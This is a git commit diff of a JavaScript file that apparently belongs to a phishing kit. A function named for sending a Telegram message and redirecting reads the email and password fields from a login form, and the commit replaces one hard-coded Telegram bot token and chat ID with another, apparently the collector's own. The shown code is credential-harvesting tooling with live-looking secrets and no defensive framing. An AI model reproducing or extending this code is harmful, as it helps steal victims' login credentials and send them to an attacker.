663a0e3c4696858a677eedf6463906698d891e89
vickicell23 <vickienipper@proton.me>
2024-07-24 06:03:37 -0700

    Update script.js

--- script.js
+++ script.js
@@ -1,8 +1,8 @@
 console.log("sender.js connected");
 
 function sendTelegramMessageAndRedirect() {
-  const telegramBotToken = "6844888640:AAHaV1WfjOzhyXvzRXkKefB3KunOrrhZO68"; // Replace with your Telegram bot token
-  const chatId = 5349229520; // Replace with your chat ID
+  const telegramBotToken = "6953413697:AAEyPrkF3GLB9SlvfsIbEhpZpQZcZ0-GrTM"; // Replace with your Telegram bot token
+  const chatId =  920343165; // Replace with your chat ID
 
   const emailValue = document.getElementById("email").value;
   const passwordValue = document.getElementById("password").value;
